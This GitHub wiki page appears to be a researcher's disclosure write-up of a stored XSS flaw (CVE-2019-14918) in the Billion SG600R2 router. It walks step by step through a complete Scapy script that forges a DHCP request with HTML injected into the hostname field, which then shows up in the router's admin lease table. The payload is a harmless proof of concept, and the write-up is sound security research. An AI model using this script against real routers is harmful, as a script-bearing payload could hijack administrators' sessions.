=== Content from github.com_d653f6ac_20250121_002243.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FInnotecSystem%2FDevice-Reversing%2Fwiki%2FXSS-Injection-via-DHCP-requests)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FInnotecSystem%2FDevice-Reversing%2Fwiki%2FXSS-Injection-via-DHCP-requests)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fwiki%2Fshow&source=header-repo&source_repo=InnotecSystem%2FDevice-Reversing)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[InnotecSystem](/InnotecSystem)
/
**[Device-Reversing](/InnotecSystem/Device-Reversing)**
Public

* [Notifications](/login?return_to=%2FInnotecSystem%2FDevice-Reversing) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2FInnotecSystem%2FDevice-Reversing)
* [Star
   5](/login?return_to=%2FInnotecSystem%2FDevice-Reversing)

* [Code](/InnotecSystem/Device-Reversing)
* [Issues
  0](/InnotecSystem/Device-Reversing/issues)
* [Pull requests
  0](/InnotecSystem/Device-Reversing/pulls)
* [Actions](/InnotecSystem/Device-Reversing/actions)
* [Projects
  0](/InnotecSystem/Device-Reversing/projects)
* [Wiki](/InnotecSystem/Device-Reversing/wiki)
* [Security](/InnotecSystem/Device-Reversing/security)
* [Insights](/InnotecSystem/Device-Reversing/pulse)

Additional navigation options

* [Code](/InnotecSystem/Device-Reversing)
* [Issues](/InnotecSystem/Device-Reversing/issues)
* [Pull requests](/InnotecSystem/Device-Reversing/pulls)
* [Actions](/InnotecSystem/Device-Reversing/actions)
* [Projects](/InnotecSystem/Device-Reversing/projects)
* [Wiki](/InnotecSystem/Device-Reversing/wiki)
* [Security](/InnotecSystem/Device-Reversing/security)
* [Insights](/InnotecSystem/Device-Reversing/pulse)

# XSS Injection via DHCP requests

[Jump to bottom](#wiki-pages-box)

Mario Bartolomé edited this page Dec 20, 2019
·
[2 revisions](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests/_history)

This is the third of three mini-posts where I will write about some fun discoveries

* 1/3: [Dissecting a ~~piñata~~Router](https://github.com/InnotecSystem/Device-Reversing/wiki/Router)
* 2/3: [Inspecting a router's firmware and reversing binaries to achieve RCE](https://github.com/InnotecSystem/Device-Reversing/wiki/Firmware-Inspection)
* **3/3: Stored XSS via DHCP injection**

# 0x03 Stored XSS via DHCP injection

This is kinda cool :) I really enjoyed exploiting this kind of vulnerability.

A stored XSS allows an attacker to *permanently* store code into a website, thus, allowing to achieve code execution on the client side, just by visiting the affected site.

When found, it's usually making use of the parameters on a request. But this one requires a little bit more to accomplish the injection.

## The scene

When accessing a router's administration web interface, we're usually presented with a simple menu on the left, and a table containing the DHCP leases the router has granted.

Those DHCP leases usually show the device name, the assigned IP address, sometimes the device's MAC address and the lease remaining time.
This case is no different. When logged in, the DHCP table is shown, and the different clients that requested an IP address lease are listed on it.

So my twisted mind starts to twist...

## Injecting in the name of...

A DHCP request can be composed by various fields, but for the sake of simplicity I will only list the needed ones here:

* Message Type: This field sets the kind of query we'll be sending (it could be a **request**, a discover, a decline, a release...).
* Requested IP Address: This is the IP address we'll be requesting.
* A HostName (this is our injection point).
* End of query.

Check the [RFC2131](https://tools.ietf.org/html/rfc2131) if you want a ton of information to choke on.

## Scapy to the rescue

So, how to send this kind of packet with such a customization? Scapy will be my weapon of choice for this kind of matter.

Scapy, is a Python library that allows to forge a vast amount of protocols. It's able to compose every layer of a protocol, in this case, we will create the following layers:

* Ethernet
* IP
* UDP
* BOOTP
* DHCP

```
from scapy.all import get_if_raw_hwaddr, mac2str, Ether, IP, UDP, BOOTP, DHCP, sendp
```

### Ethernet layer

The first layer to assemble is the Ethernet layer. By default, Scapy will provide with the optional parameters, so only the source and destination MAC addresses are needed on this step.

To issue a DHCP request, the destination MAC address should be the broadcast one (`FF:FF:FF:FF:FF:FF`), and the source one our own MAC address.

```
fam, my_mac = get_if_raw_hwaddr("eth0")
brdcast_mac = mac2str("ff:ff:ff:ff:ff:ff")

ether_layer = Ether(src=my_mac, dst=brdcast_mac)
```

### IP layer

The second layer to assemble is the IP layer. Again, Scapy will take care of most of the parameters and we'll only need to issue the source and destination. The source address should be set to `0.0.0.0` and the destination address should be set to the network broadcast address `255.255.255.255`.

```
ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
```

That's it for this layer!

### UDP layer

The third layer will define the kind of transmission protocol to use. DHCP should be driven on a state-less manner, so UDP must be used. The layer must set the source and destination port. The DCHP request must come from port 68 and the server is likely to be running at port 67.

```
udp_layer = UDP(sport=68, dport=67)
```

### BOOTP layer

DHCP is an extension of BOOTP, so in this layer we will only define the client MAC address.

```
bootp_layer = BOOTP(chaddr=my_mac)
```

### DHCP layer

Finally! The interesting stuff. As stated before, the `message-type`, `requested_addr`, `hostname` and `end` fields will be defined. That way the server will be happy with the request, and will attempt to issue a lease for us, adding a new entry to the DHCP table visible on the web interface, aaaaand the injection will take place.

```
dhcp_layer = DHCP(options=[
	('message-type', 'request'),
	('requested_addr', '192.168.5.100'),
	('hostname', '</td><h1>0xMrIO'),  # Here's where the injection takes place!
	'end',
	'\x00' * 11
	]
)
```

As shown above, the `'hostname'` parameter performs the injection against the DHCP lease table.
What's that `\x00' * 11`? A padding. The server running on this router wouldn't be ok without a packet size divisible by 16.

## To summarize

Scapy allows to assemble the whole packet by *dividing* its layers. Every layer in Scapy has overloaded the division operator to achieve packet assembly.

So the whole code would be like:

```
from scapy.all import get_if_raw_hwaddr, mac2str, Ether, IP, UDP, BOOTP, DHCP, sendp
fam, my_mac = get_if_raw_hwaddr("eth0")
brdcast_mac = mac2str("ff:ff:ff:ff:ff:ff")

ether_layer = Ether(src=my_mac, dst=brdcast_mac)
ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
udp_layer = UDP(sport=68, dport=67)
bootp_layer = BOOTP(chaddr=my_mac)
dhcp_layer = DHCP(options=[
	('message-type', 'request'),
	('requested_addr', '192.168.5.100'),
	('hostname', '</td><h1>0xMrIO'),  # Here's where the injection takes place!
	'end',
	'\x00' * 11
	]
)

dhcp_request = ether_layer / ip_layer / udp_layer / bootp_layer / dhcp_layer

sendp(dhcp_request)
```

By keeping WireShark listening on the desired interface, we can note how the packet sent is a successful DHCP request, and is properly answered by the DHCP server running in the router.

![DHCP Req and ACK](https://user-images.githubusercontent.com/23175380/64935620-8e6df700-d852-11e9-9abd-759997a711fe.png)

---

And finally, the DHCP lease table is altered, and our code was successfully injected:

![DHCP lease table modified](https://user-images.githubusercontent.com/23175380/64935660-c2e1b300-d852-11e9-9e50-67d00b0b3a32.png)

1. Is the `<h1>0xMrIO` injection.
2. That's the point where the hostname should be stored.
3. That's the `</td>` issued to close that table field.

---

**Affected product/version:** Billion Smart Energy Router SG600R2. Firmw v3.02.rc6

* CVE-2019-14918

### Toggle table of contents Pages 4

* Loading

  [Home](/InnotecSystem/Device-Reversing/wiki)
* Loading

  [Dissecting a router](/InnotecSystem/Device-Reversing/wiki/Dissecting-a-router)
* Loading

  [Firmware Inspection](/InnotecSystem/Device-Reversing/wiki/Firmware-Inspection)
* Loading

  [XSS Injection via DHCP requests](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests)

  + [0x03 Stored XSS via DHCP injection](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#0x03-stored-xss-via-dhcp-injection)
  + [The scene](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#the-scene)
  + [Injecting in the name of...](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#injecting-in-the-name-of)
  + [Scapy to the rescue](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#scapy-to-the-rescue)
  + [Ethernet layer](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#ethernet-layer)
  + [IP layer](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#ip-layer)
  + [UDP layer](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#udp-layer)
  + [BOOTP layer](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#bootp-layer)
  + [DHCP layer](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#dhcp-layer)
  + [To summarize](/InnotecSystem/Device-Reversing/wiki/XSS-Injection-via-DHCP-requests#to-summarize)

##### Clone this wiki locally

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


